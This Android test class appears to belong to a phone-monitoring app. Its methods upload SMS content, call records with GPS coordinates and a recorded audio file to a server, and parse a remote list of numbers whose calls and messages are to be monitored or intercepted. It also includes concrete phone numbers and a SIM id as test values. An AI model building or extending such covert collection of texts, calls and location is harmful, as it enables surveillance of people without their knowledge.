package com.privacy.monitor.test;

import java.io.IOException;
import java.io.InputStream;
import java.util.Date;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import com.privacy.monitor.util.AppUtil;
import com.privacy.monitor.util.Logger;
import com.privacy.monitor.util.NetworkUtil;
import android.content.res.AssetManager;
import android.test.AndroidTestCase;
import android.text.TextUtils;

public class Test extends AndroidTestCase {
	private static final String TAG = Test.class.getSimpleName();
	
	public void update(){
		Date date = new Date();
		
		String updateDate = "my_num=15622231934&you_num=13538715695&time="+date.getTime()+"&content=测试测试&type=1&sim_id=1234567890987654321";
	
		String updateResult= AppUtil.streamToStr(NetworkUtil.upload(getContext(),updateDate,"1c1d4f559ebbc08c492539282f36f969"));
		Logger.d("Test",updateResult);
	}
	
	public void download(){
		String updateResult= AppUtil.streamToStr(NetworkUtil.download(getContext(),"tel=13538715695","041e83198b89ce1eb95d05b41b5b1a67"));
		Logger.d("Test",updateResult);
		 if(!TextUtils.isEmpty(updateResult)){
		    	try {
					JSONObject jsonObject = new JSONObject(updateResult);
					JSONObject callObject = jsonObject.getJSONObject("call");
					JSONArray jsonArray = callObject.getJSONArray("monitor");
					int callListLength = jsonArray.length();
					for(int j =0 ; j < callListLength ; j++){
						String callMonitorPhone= jsonArray.getString(j);
						
						Logger.d(TAG,"监听通话号码为:"+callMonitorPhone);
					}
					
					JSONArray jArrayNotMonitor = callObject.getJSONArray("not_monitor");
					int length3 = jArrayNotMonitor.length();
					for(int i = 0 ; i < length3 ; i++){
						String notMonitorStr = jArrayNotMonitor.getString(i);
						
						Logger.d(TAG,"不监听的通话号码:"+notMonitorStr);
					}
					
					String location = jsonObject.getString("loc");
					Logger.d(TAG, "是否定位:"+location);
					
					JSONObject msgJsonObject = jsonObject.getJSONObject("msg");
					JSONArray jsonArray2 = msgJsonObject.getJSONArray("monitor");
					int length4 = jsonArray2.length();
					for(int b = 0 ; b<length4 ; b++){
						String msgMonitorPhone = jsonArray2.getString(b);
						
						Logger.d(TAG,"信息监听号码:"+msgMonitorPhone);
					}
					
					JSONArray jsonArray3 = msgJsonObject.getJSONArray("not_monitor");
					int lengtn5 = jsonArray3.length();
					for(int c = 0 ; c < lengtn5 ; c++){
						String msgNotMonitor = jsonArray3.getString(c);
						
						Logger.d(TAG,"信息不监听号码:"+msgNotMonitor);
					}
					
					JSONArray jsonArray4 = msgJsonObject.getJSONArray("filter");
					int length6 = jsonArray4.length();
					for(int u = 0 ;u < length6 ; u++){
						String msgFilter = jsonArray4.getString(u);
						
						Logger.d(TAG,"信息拦截号码:"+msgFilter);
					}
					
				} catch (JSONException e) {
					Logger.d("CronBroadcaseRectiver",e.getMessage());
				}
		    }
	}
	
	public void uploadCallRecord(){
		long currentTime = new Date().getTime();
		long endTime = currentTime + 10000;
		double latitude = 23.1306074583;
		double longitude =113.3677183982;
		AssetManager assetManager = getContext().getResources().getAssets();
		try {
			String result = NetworkUtil.uploadCall("10086","13538715695","路飞",currentTime+"",endTime+"","6788723234", longitude+"",latitude+"","nexus-s","0");
			Logger.d("Test",result);
			if(!result.startsWith("FAULT")){
				InputStream inputStream = assetManager.open("sound.mp3");
				String uploadFileResult = NetworkUtil.uploadFile(result, inputStream);
				Logger.d("Test",uploadFileResult);
			}
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
	}
}
